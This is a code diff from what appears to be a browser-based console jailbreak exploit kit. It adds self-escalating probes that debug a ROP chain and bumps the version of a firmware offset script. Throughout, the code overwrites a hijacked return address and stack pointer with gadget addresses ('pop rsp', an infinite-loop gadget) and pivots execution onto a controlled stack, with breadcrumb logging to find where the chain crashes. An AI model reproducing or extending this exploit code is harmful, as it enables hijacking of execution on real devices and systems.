@@ -213,12 +213,26 @@ async function prepare(p) {
         /* Self-sequencing bisect. renderNav() is stubbed in this build, so the
            console has no way to reach a ?probe= URL -- escalate automatically
            on the run after a crash instead, driven by where the last one died. */
-        if (!PROBE && last === "nc") {
+        /* The null chain is bracketed by nc .. nc-ok, and launch_chain writes
+           its own crumbs (w1/w2/armed/pm) in between -- so a dead null chain
+           ends the trail at 'pm', not at 'nc'. Test for the missing CLOSING
+           crumb, not for the last one. */
+        const diedInNullChain = parts.indexOf("nc") !== -1
+            && parts.indexOf("nc-ok") === -1;
+        const triedPivotProbe = parts.some(x => x.indexOf("probe-pivot") === 0);
+        const pivotWasSilent = parts.indexOf("probe-pivot-SILENT") !== -1;
+        const triedRspProbe = parts.some(x => x.indexOf("probe-rsp") === 0);
+        if (!PROBE && pivotWasSilent && !triedRspProbe) {
+            PROBE = "rsp";
+            jbmark("PROBE-AUTO", "the hijacked return address executes cleanly"
+                + " (infloop parked the worker, no crash) -- escalating to"
+                + " probe=rsp to test `pop rsp` and the stack switch");
+        } else if (!PROBE && diedInNullChain && !triedPivotProbe) {
             PROBE = "pivot";
-            jbmark("PROBE-AUTO", "the empty chain died, so setjmp/longjmp or the"
-                + " pivot itself is at fault, not the syscall stub"
-                + " -- escalating to probe=pivot this run");
-        } else if (!PROBE && last.indexOf("probe-pivot") === 0) {
+            jbmark("PROBE-AUTO", "the EMPTY chain died (nc with no nc-ok), so the"
+                + " syscall stub is exonerated -- setjmp/longjmp or the pivot"
+                + " itself is at fault. Escalating to probe=pivot this run");
+        } else if (!PROBE && triedPivotProbe) {
             jbmark("PROBE-VERDICT", "the previous run died at '" + last
                 + "', i.e. the WORKER CRASHED with only a `jmp $` written into"
                 + " the return slot. Nothing of ours executed but that one"
@@ -756,6 +770,34 @@ async function prepare(p) {
                 + "-poprsp=0x" + gadgets["pop rsp"].toString()
                 + "-rsp=0x" + chain.stack_entry_point.toString());
 
+        if (PROBE === "rsp") {
+            /* One step past probe=pivot: use the REAL pivot gadget and switch
+               to a stack we control, whose only entry is `jmp $`. That covers
+               `pop rsp` and the stack switch but still touches neither setjmp
+               nor longjmp nor the restore-writes. Silent => the pivot gadget
+               and the switch are both sound and only the chain BODY is left. */
+            const probeStack = malloc(0x40);
+            p.write8(probeStack, gadgets["infloop"]);
+            crumb("probe-rsp-w1");
+            p.write8(return_address_ptr, gadgets["pop rsp"]);
+            p.write8(stack_pointer_ptr, probeStack);
+            crumb("probe-rsp-armed");
+            const ans = await new Promise((resolve) => {
+                const t = setTimeout(() => resolve(false), 6000);
+                worker.onmessage = function () { clearTimeout(t); resolve(true); };
+                crumb("probe-rsp-pm");
+                worker.postMessage(0);
+            });
+            crumb("probe-rsp-" + (ans ? "ANSWERED" : "SILENT"));
+            throw new Error("probe=rsp: worker "
+                + (ans ? "ANSWERED -- `pop rsp` did not take the pivot"
+                    : "went SILENT without crashing -- `pop rsp` (0x"
+                    + wk_gadgetmap["pop rsp"].toString(16) + ") and the stack"
+                    + " switch to 0x" + probeStack.toString() + " BOTH work."
+                    + " Only setjmp/longjmp and the restore-writes remain.")
+                + " Worker is spinning; reload.");
+        }
+
         if (PROBE === "pivot") {
             /* Write a `jmp $` instead of the pivot and change nothing else.
                If the worker then goes quiet WITHOUT crashing, the hijacked
@@ -875,4 +917,4 @@ let fwScript = document.createElement('script');
 document.body.appendChild(fwScript);
 
 window.__offsetsScript = fwScript;
-fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=24`);
+fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=25`);
